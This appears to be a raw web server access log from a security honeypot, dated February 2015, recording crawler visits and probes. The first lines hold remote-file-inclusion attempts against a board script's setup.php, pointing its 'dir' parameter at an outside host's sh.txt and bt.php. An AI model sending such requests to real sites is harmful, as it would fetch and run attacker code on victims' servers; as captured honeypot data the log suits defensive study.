176.31.252.38 - - [20/Feb/2015:23:23:10 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:23:10 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:23:11 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:23:12 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:23:13 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
178.137.92.19 - - [20/Feb/2015:23:24:02 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://rabotaru.5bb.ru/" "Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.2; SV1)" 
178.137.92.19 - - [20/Feb/2015:23:24:02 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://rabotaru.5bb.ru/" "Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.2; SV1)" 
178.137.92.19 - - [20/Feb/2015:23:24:03 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://rabotaru.5bb.ru/" "Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.2; SV1)" 
207.46.13.0 - - [21/Feb/2015:00:07:32 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.0 - - [21/Feb/2015:00:07:33 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.0 - - [21/Feb/2015:00:07:38 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.0 - - [21/Feb/2015:00:22:31 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.0 - - [21/Feb/2015:00:22:33 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
219.85.42.145 - - [21/Feb/2015:00:27:41 -0800] "GET //honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" 
